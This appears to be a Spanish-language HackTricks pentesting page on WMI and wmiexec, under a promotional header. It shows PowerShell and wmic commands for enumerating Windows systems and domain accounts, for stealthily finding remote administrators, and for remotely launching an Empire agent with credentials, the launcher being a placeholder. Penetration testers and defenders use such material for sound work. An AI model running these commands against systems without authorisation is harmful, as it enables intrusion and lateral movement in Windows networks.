# WmicExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## ¿Cómo funciona?

Wmi permite abrir procesos en hosts donde se conoce el nombre de usuario/(contraseña/Hash). Luego, Wmiexec utiliza wmi para ejecutar cada comando que se le pide que ejecute (por eso Wmicexec te da una shell semi-interactiva).

**dcomexec.py:** Este script proporciona una shell semi-interactiva similar a wmiexec.py, pero utilizando diferentes puntos finales DCOM (objeto DCOM ShellBrowserWindow). Actualmente, admite MMC20. Aplicación, ventanas de shell y objetos de ventana del navegador de shell. (de [aquí](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## Conceptos básicos de WMI

### Espacio de nombres

WMI se divide en una jerarquía de estilo de directorio, el contenedor \root, con otros directorios bajo \root. Estas "rutas de directorio" se llaman espacios de nombres.\
Listar espacios de nombres:
```bash
#Get Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

#List all namespaces (you may need administrator to list all of them)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

#List namespaces inside "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Lista las clases de un espacio de nombres con:
```bash
gwmwi -List -Recurse #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Clases**

El nombre de la clase WMI, por ejemplo, win32\_process, es un punto de partida para cualquier acción de WMI. Siempre necesitamos conocer el nombre de la clase y el espacio de nombres donde se encuentra.\
Lista de clases que comienzan con `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Llamar a una clase:
```bash
#When you don't specify a namespaces by default is "root/cimv2"
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Métodos

Las clases de WMI tienen una o más funciones que pueden ser ejecutadas. Estas funciones se llaman métodos.
```bash
#Load a class using [wmiclass], leist methods and call one
$c = [wmiclass]"win32_share"
$c.methods
#Find information about the class in https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-share
$c.Create("c:\share\path","name",0,$null,"My Description")
#If returned value is "0", then it was successfully executed
```

```bash
#List methods
Get-WmiObject -Query 'Select * From Meta_Class WHERE __Class LIKE "win32%"' | Where-Object { $_.PSBase.Methods } | Select-Object Name, Methods
#Call create method from win32_share class
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## Enumeración de WMI

### Verificar el servicio de WMI

Así es como puedes verificar si el servicio de WMI está en ejecución:
```bash
#Check if WMI service is running
Get-Service Winmgmt
Status   Name               DisplayName
------   ----               -----------
Running  Winmgmt            Windows Management Instrumentation

#From CMD
net start | findstr "Instrumentation"
```
### Información del sistema
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
```
### Información del Proceso
```bash
Get-WmiObject win32_process | Select Name, Processid
```
Desde la perspectiva de un atacante, WMI puede ser muy valioso para enumerar información sensible sobre un sistema o el dominio.
```
wmic computerystem list full /format:list  
wmic process list /format:list  
wmic ntdomain list /format:list  
wmic useraccount list /format:list  
wmic group list /format:list  
wmic sysaccount list /format:list  
```

```bash
 Get-WmiObject Win32_Processor -ComputerName 10.0.0.182 -Credential $cred
```
## **Consulta remota manual de WMI**

Por ejemplo, aquí hay una forma muy sigilosa de descubrir administradores locales en una máquina remota (tenga en cuenta que el dominio es el nombre de la computadora):
```bash
wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")  
```
Otro comando útil en una sola línea es ver quién ha iniciado sesión en una máquina (para cuando estás buscando administradores):
```
wmic /node:ordws01 path win32_loggedonuser get antecedent  
```
`wmic` incluso puede leer nodos desde un archivo de texto y ejecutar el comando en todos ellos. Si tienes un archivo de texto con estaciones de trabajo:
```
wmic /node:@workstations.txt path win32_loggedonuser get antecedent  
```
Crearemos de forma remota un proceso a través de WMI para ejecutar un agente de Empire.
```bash
wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"  
```
Vemos que se ejecuta con éxito (ReturnValue = 0). Y un segundo después, nuestro listener de Empire lo captura. Tenga en cuenta que el ID del proceso es el mismo que devolvió WMI.

Toda esta información fue extraída de aquí: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
